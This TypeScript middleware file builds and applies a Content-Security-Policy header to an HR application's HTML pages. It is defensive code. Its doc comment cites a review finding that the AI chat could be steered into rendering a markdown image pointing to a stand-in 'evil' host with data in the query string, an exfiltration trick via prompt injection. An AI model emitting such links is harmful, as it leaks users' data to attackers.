import { defineHttpMiddleware } from '@nocobase/app-server/router';
import type { Application } from '@nocobase/app-server/application';

import type { ContentSecurityPolicyConfig } from '../config/content-security-policy.js';

/**
 * A baseline Content-Security-Policy for the application's HTML pages
 * (2026-10-07 readiness review: the AI chat could be steered into rendering
 * `![](https://evil/?d=…)`, and the application sent no CSP).
 *
 * Added to the template's HTTP middleware in `server/app.ts` because the SPA
 * module (`@nocobase/app-server/spa`) sets no security headers and has no
 * option for them. It is applied only to HTML responses outside `/api/`, i.e.
 * the client page itself; API routes that render a printable document keep
 * their own markup. It is not applied while `pnpm dev` proxies the page from
 * Vite (`spa.viteDevUrl`), whose HMR client needs inline scripts and its own
 * WebSocket origin.
 *
 * `'self'` in `connect-src` covers the same-origin WebSocket (`ws:`/`wss:`)
 * in current browsers. Office previews embed Microsoft's viewer, hence its
 * origin in `frame-src`.
 */
export function buildContentSecurityPolicy(
  config: Pick<
    ContentSecurityPolicyConfig,
    'imgSrc' | 'connectSrc' | 'frameSrc'
  > = { imgSrc: [], connectSrc: [], frameSrc: [] },
): string {
  const join = (base: string[], extra: readonly string[] = []) =>
    [...base, ...extra.map((value) => value.trim()).filter(Boolean)].join(' ');
  return [
    `default-src 'self'`,
    `script-src 'self'`,
    `style-src 'self' 'unsafe-inline'`,
    `img-src ${join(["'self'", 'data:', 'blob:'], config.imgSrc)}`,
    `media-src ${join(["'self'", 'data:', 'blob:'], config.imgSrc)}`,
    `font-src 'self' data:`,
    `connect-src ${join(["'self'"], config.connectSrc)}`,
    `frame-src ${join(["'self'", 'blob:', 'https://view.officeapps.live.com'], config.frameSrc)}`,
    `worker-src 'self' blob:`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `frame-ancestors 'self'`,
  ].join('; ');
}

export const contentSecurityPolicyMiddleware =
  defineHttpMiddleware<Application>({
    name: 'nocohr/content-security-policy',
    register(router, app) {
      const config = app.config.get<Partial<ContentSecurityPolicyConfig>>(
        'contentSecurityPolicy',
      );
      const viteDevUrl = app.config.get<string | null>('spa.viteDevUrl');
      if (config?.enabled === false || viteDevUrl) return;
      const header = buildContentSecurityPolicy({
        imgSrc: config?.imgSrc ?? [],
        connectSrc: config?.connectSrc ?? [],
        frameSrc: config?.frameSrc ?? [],
      });
      router.use('*', async (context, next) => {
        // API paths pass through untouched: no header, and the response, its
        // status or an error a later handler throws stay exactly as they are.
        if (/\/api(?:\/|$)/u.test(context.req.path)) return next();
        await next();
        const type = context.res.headers.get('content-type') ?? '';
        if (!type.toLowerCase().includes('text/html')) return;
        if (context.res.headers.has('content-security-policy')) return;
        try {
          context.res.headers.set('content-security-policy', header);
        } catch {
          // A Response with immutable headers (e.g. one passed through from fetch).
          const response = new Response(context.res.body, context.res);
          response.headers.set('content-security-policy', header);
          context.res = response;
        }
      });
    },
  });
